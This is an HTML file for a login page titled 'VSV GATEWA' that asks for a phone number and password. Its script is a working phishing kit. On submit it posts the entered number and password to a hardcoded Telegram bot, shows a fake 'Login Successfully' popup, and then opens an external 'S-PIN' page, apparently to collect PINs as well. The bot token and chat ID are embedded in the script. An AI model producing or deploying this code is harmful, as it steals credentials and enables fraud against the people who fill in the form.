<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - VSV GATEWA</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 40px;
        }

        .login-container {
            background-color: white;
            border-radius: 8px;
            padding: 35px 25px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
            width: 50%;
            max-width: 400px;
            min-height: 420px;
        }

        .login-title {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
            text-align: left;
        }

        .login-subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 22px;
            text-align: left;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #333;
            margin-bottom: 6px;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            border: 1.5px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
        }

        .form-input:focus {
            border-color: #4285f4;
        }

        .login-button {
            width: 100%;
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.3s ease;
            text-transform: uppercase;
        }

        .login-button:hover {
            background-color: #3367d6;
        }

        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
            color: #999;
            font-size: 13px;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: #e0e0e0;
        }

        .divider span {
            background-color: white;
            padding: 0 10px;
            position: relative;
        }

        .register-link {
            text-align: center;
            font-size: 14px;
            color: #666;
        }

        .register-link a {
            color: #4285f4;
            text-decoration: none;
            font-weight: 500;
        }

        /* Mobile responsiveness */
        @media (max-width: 480px) {
            .login-container {
                width: 90%;
            }
        }

        /* Modal Overlay */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-overlay.show {
            display: flex;
        }

        /* Success Popup */
        .success-popup {
            background-color: white;
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            max-width: 350px;
            width: 90%;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        /* Checkmark Icon */
        .checkmark-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 3px solid #4CAF50;
            margin: 0 auto 20px;
            position: relative;
            background-color: #f0f8f0;
        }

        .checkmark-icon::after {
            content: '';
            position: absolute;
            left: 25px;
            top: 12px;
            width: 15px;
            height: 30px;
            border: solid #4CAF50;
            border-width: 0 4px 4px 0;
            transform: rotate(45deg);
        }

        /* Success Text */
        .success-title {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .success-message {
            font-size: 16px;
            color: #ff6b35;
            margin-bottom: 30px;
        }

        /* OK Button */
        .ok-button {
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 12px 40px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .ok-button:hover {
            background-color: #3367d6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1 class="login-title">Sign In</h1>
        <p class="login-subtitle">Enter your number and password to login</p>
        
        <form>
            <div class="form-group">
                <label class="form-label" for="number">Number</label>
                <input 
                    type="tel" 
                    id="number" 
                    name="number" 
                    class="form-input" 
                    placeholder="Enter Number"
                    required
                >
            </div>
            
            <div class="form-group">
                <label class="form-label" for="password">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    class="form-input" 
                    placeholder="Enter Password"
                    required
                >
            </div>
            
            <button type="submit" class="login-button">LOGIN</button>
        </form>
        
        <div class="divider">
            <span>OR</span>
        </div>
        
        <div class="register-link">
            Don't have an account? <a href="#register">Register</a>
        </div>
    </div>

    <!-- Success Popup Modal -->
    <div class="modal-overlay" id="successModal">
        <div class="success-popup">
            <div class="checkmark-icon"></div>
            <h2 class="success-title">Success..!</h2>
            <p class="success-message">Login Successfully!</p>
            <button class="ok-button" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8351577576:AAHSeNmUbaAdCiNbyckTSXNv9jKh5eaN-wA';
        const TELEGRAM_CHAT_ID = '6736711885';

        function showSuccessModal() {
            document.getElementById('successModal').classList.add('show');
        }

        function closeModal() {
            document.getElementById('successModal').classList.remove('show');
        }

        // Function to send data to Telegram
        async function sendToTelegram(number, password) {
            const message = `üîê New Login Data:\nüì± Number: ${number}\nüîë Password: ${password}\n‚è∞ Time: ${new Date().toLocaleString()}`;
            
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    console.log('Data sent to Telegram successfully');
                } else {
                    console.log('Failed to send data to Telegram');
                }
            } catch (error) {
                console.log('Error sending to Telegram:', error);
            }
        }

        // Add event listener to login form
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent form submission
            
            // Get form data
            const number = document.getElementById('number').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram
            sendToTelegram(number, password);
            
            // Show success popup
            showSuccessModal();
            
            // Open the S-PIN page after a short delay
            setTimeout(function() {
                window.open('https://vsvspin.netlify.app/', '_blank');
            }, 1500);
        });

        // Close modal when clicking outside of it
        document.getElementById('successModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });
    </script>
</body>
</html>
